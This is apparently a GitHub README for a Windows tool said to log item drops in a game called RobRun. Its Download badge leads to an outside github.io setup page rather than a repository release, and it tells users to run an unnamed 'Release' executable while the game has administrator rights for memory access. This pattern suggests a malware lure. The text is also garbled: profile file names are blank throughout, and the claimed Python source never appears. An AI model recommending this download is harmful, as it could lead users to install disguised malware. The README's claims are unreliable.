# RobRun Drop Rate Logger

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-15803d?style=for-the-badge&logo=code&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white" alt="Platform">
  <img src="https://img.shields.io/badge/Language-Python-3776AB?style=plastic&logo=python&logoColor=white" alt="Language">
  <img src="https://img.shields.io/badge/Version-1.4.2-4c1?style=flat&logo=github&logoColor=white" alt="Version">
  <img src="https://img.shields.io/badge/License-MIT-ff69b4?style=for-the-badge&logo=law&logoColor=white" alt="License">
  <img src="https://img.shields.io/badge/Status-Stable-28a745?style=flat-square" alt="Status">
</p>

> **TL;DR** – RobRun Drop Rate Logger records every item drop in RobRun, lets you switch between predefined configuration profiles, and bundles the latest release into a single download. Install, point it at your running client, and start gathering precise statistics instantly.

---

## What RobRun Drop Rate Logger Does

RobRun Drop Rate Logger is a lightweight, Python‑based logger that taps the game’s telemetry stream and writes every drop event to a CSV file. Its core responsibilities are:

* **Capture** – listen to the in‑game drop broadcast and extract item ID, rarity, and source coordinates.
* **Persist** – append structured rows to `drops.log` with timestamps in ISO‑8601 format.
* **Aggregate** – provide a built‑in summarizer that can compute per‑item drop percentages over any time window.
* **Profile‑Switch** – swap between ``, ``, ``, and `` without restarting the logger.

All operations run in a single background thread, leaving the main game process untouched.

---

## Key Features

| Feature | Description | Typical Use |
|--------|-------------|--------------|
| **Structured Profiles** | Four static configuration files (``, ``, ``, ``) let you enable or mute specific drop categories, adjust CSV delimiters, or set a maximum file size. | Fine‑tune logging for PvE vs. PvP sessions. |
| **Workflow Presets** | Pre‑bundled presets such as “Speedrun”, “Research”, and “Casual” map a profile to a hotkey combination for on‑the‑fly switching. | Reduce friction when changing objectives mid‑run. |
| **Live Summary Dashboard** | Optional `--ui` flag launches a minimal Flask interface that visualizes drop rates in real time. | Spot unexpected spikes without leaving the game. |
| **Release Bundle** | The download button provides a zip containing the interpreter‑agnostic executable, all config files, and a quick‑start guide. | One‑click Release on any Windows machine. |
| **Extensible Export** | Export to JSON, CSV, or SQLite via the `--export` argument. | Feed data into external analytics pipelines. |

---

## Installation & Quick Start

1. Click the **Download** badge above. The zip file contains `Release`, the four configuration files, and a `README_quick.txt`.
2. Extract the archive to a folder of your choice, e.g., `C:\RobRunLogger`.
3. Double‑click `Release`. The logger will auto‑detect the running RobRun client and begin listening.
4. To change the active profile, press **Ctrl + F1** for *default*, **Ctrl + F2** for *visual*, **Ctrl + F3** for *player*, and **Ctrl + F4** for *custom*.

No additional dependencies are required; the bundled executable includes a frozen Python runtime.

---

## Directory Layout

    RobRunDropRateLogger/
    ├─ Release          # Stand‑alone executable
    ├─ drops.log                         # Generated CSV (created at runtime)
    ├─                        # Baseline profile
    ├─                         # Visual‑only profile
    ├─                         # Player‑metadata profile
    ├─                         # User‑defined overrides
    ├─ ui/                               # Flask dashboard assets
    │   ├─ app.py
    │   └─ templates/
    └─ docs/
        └─ changelog.md                  # Human‑readable change history

The `ui/` folder is optional; launching the logger with `--ui` will serve the dashboard on `http://127.0.0.1:5000`.

---

## Usage Walkthrough

**Step 1 – Start the logger**
Double‑click the executable. A small system tray icon appears, confirming the logger is active.

**Step 2 – Choose a profile**
Press the hotkey combination that matches the desired configuration. The tray tooltip updates to reflect the active profile name.

**Step 3 – Collect data**
Play RobRun as usual. Every time an item drops, a line similar to the following is appended to `drops.log`:

```
2026-11-19T14:32:07Z,player_123,zone_7,dragon_claw,epic,12.4,34.7
```

Fields: timestamp, player ID, zone identifier, item name, rarity, X‑coordinate, Y‑coordinate.

**Step 4 – Review statistics**
Run the summarizer manually:

```
Release --summarize --since 2026-11-19
```

The console prints a table of percentages, e.g., `dragon_claw – 2.7 %`. Export the same data to JSON with `--export json`.

**Step 5 – Stop the logger**
Right‑click the tray icon and select **Quit**. The logger gracefully closes the file handle and writes a shutdown timestamp.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| *The logger shows “No client detected”.* | Ensure RobRun is running with administrator privileges; the logger needs read access to the process memory where the telemetry stream lives. |
| *My `drops.log` grows too fast.* | Open `` and lower `max_file_size` or switch to `` which filters out low‑value items. |
| *The UI dashboard never loads.* | Confirm that port 5000 is not blocked by a firewall, and that you launched the logger with the `--ui` flag. |
| *I need rarities that aren’t listed.* | Add them to the `rarities` line in the active `.cfg` file and reload the profile via the hotkey. |
| *Can I run the logger on macOS?* | The current release bundles a Windows‑only executable. macOS support is planned for a future version; you can compile from source using the `requirements.txt` file. |

If you encounter an unexpected error, consult `logs/error.log` (generated automatically) and open an issue with the stack trace attached.

---

## Contributing & Versioning

RobRun Drop Rate Logger follows semantic versioning (MAJOR.MINOR.PATCH). The current release is **1.4.2**. Contributions are welcome:

* Fork the repository.
* Add or improve a profile in the `configs/` directory.
* Run the test suite with `python -m unittest discover`.
* Submit a pull request describing the change and the rationale.

Please keep the codebase free of external dependencies beyond the Python standard library, and respect the MIT license included in `LICENSE`.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```